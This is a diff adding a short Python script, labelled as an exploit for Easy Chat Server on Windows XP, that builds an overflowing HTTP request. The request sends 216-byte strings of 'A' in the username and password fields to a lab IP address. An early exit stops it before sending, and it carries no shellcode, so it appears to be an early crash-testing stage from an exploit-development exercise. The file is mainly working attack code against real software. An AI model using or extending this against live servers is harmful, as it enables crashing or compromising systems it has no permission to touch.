@@ -1,0 +1,13 @@
+#Exploit for the Easy chat server on windows xp 3
+#https://www.exploit-db.com/exploits/11179/
+#!/usr/bin/python
+
+import socket, sys
+#request = b"GET / HTTP/1.1\nHost: www.cnn.com\n\n"
+buf = '\x41' * 216
+request = b'GET /chat.ghp?username=' + buf + '&password=' + buf + '&room=1&sex=2 HTTP/1.1\nHost: 192.168.20.2\n\n'
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print request
+sys.exit(0)
+s.connect(('192.168.20.2', 80))
+s.send(request)
